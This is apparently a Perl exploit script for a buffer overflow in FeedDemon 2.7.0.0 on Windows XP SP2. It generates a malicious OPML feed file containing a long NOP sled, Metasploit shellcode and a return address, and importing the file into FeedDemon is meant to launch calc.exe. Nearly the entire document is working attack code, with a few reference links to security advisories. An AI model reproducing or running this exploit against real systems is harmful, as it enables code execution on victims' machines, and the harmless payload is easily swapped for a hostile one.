#!/usr/local/bin/perl
#-----------------------------------------------------------------------------
# FeedDemon version 2.7.0.0 Buffer overFlow
# Reference:
#	http://security.bkis.vn/?p=329
#	http://www.securityfocus.com/bid/33630/info
#	http://secunia.com/advisories/33718/
# Tested in Windows XP Sp2 (English)
# Created by cenjan (xcenjanx@yahoo.com)
# Description: 	 + This code generates a opml file (feeddemonexploit.opml)
#              		 + Import that file by the Import Feed function of Feed Demon
#               		+ The calc.exe will execute
#-----------------------------------------------------------------------------
my $head='<opml version="1.1"><body><outline text="';
my $overflow = "\x90" x 8006;

# Shellcode by Metasploit
my $devil=
"\x31\xC9\x83\xE9\xDE\xD9\xEE\xD9\x74\x24\xF4\x5B\x81\x73\x13\xEC".
"\x2D\x36\x5E\x83\xEB\xFC\xE2\xF4\x10\xC5\x72\x5E\xEC\x2D\xBD".
"\x1B\xD0\xA6\x4A\x5B\x94\x2C\xD9\xD5\xA3\x35\xBD\x1\xCC\x2C".
"\xDD\x17\x67\x19\xBD\x5F\x2\x1C\xF6\xC7\x40\xA9\xF6\x2A\xEB".
"\xEC\xFC\x53\xED\xEF\xDD\xAA\xD7\x79\x12\x5A\x99\xC8\xBD\x1".
"\xC8\x2C\xDD\x38\x67\x21\x7D\xD5\xB3\x31\x37\xB5\x67\x31\xBD".
"\x5F\x7\xA4\x6A\x7A\xE8\xEE\x7\x9E\x88\xA6\x76\x6E\x69\xED".
"\x4E\x52\x67\x6D\x3A\xD5\x9C\x31\x9B\xD5\x84\x25\xDD\x57\x67".
"\xAD\x86\x5E\xEC\x2D\xBD\x36\xD0\x72\x7\xA8\x8C\x7B\xBF\xA6".
"\x6F\xED\x4D\xE\x84\xDD\xBC\x5A\xB3\x45\xAE\xA0\x66\x23\x61".
"\xA1\xB\x4E\x57\x32\x8F\x2D\x36\x5E\x90\x90\x90\x90\x90\x90".
"\x90\x90\xED\x1E\x94\x7C\x90\x90\x90\x90\x90\x90\x90\x90\x90".
"\x90\x90\x90\x90\x90\x89\xE1\xFE\xCD\xFE\xCD\xFE\xCD\xFE\xCD".
"\xFE\xCD\xFE\xCD\x89\xCC\xFF\xE4";

my $tail='"><outline text="BKIS" title="SVRT" type="rss" xmlUrl="http://milw0rm.com/rss.php"/></outline></body></opml>';
open (f,'>feeddemonexploit.opml');
print f "\xff\xfe";
close(f);

open (f,'>>:encoding(ucs-2le)','feeddemonexploit.opml');
print f $head;
close(f);

open (f,'>>feeddemonexploit.opml');
print f $overflow;
print f $devil;
close(f);

open (f,'>>:encoding(ucs-2le)','feeddemonexploit.opml');
print f $tail;
close (f);
print "Create exploit file successfully!";

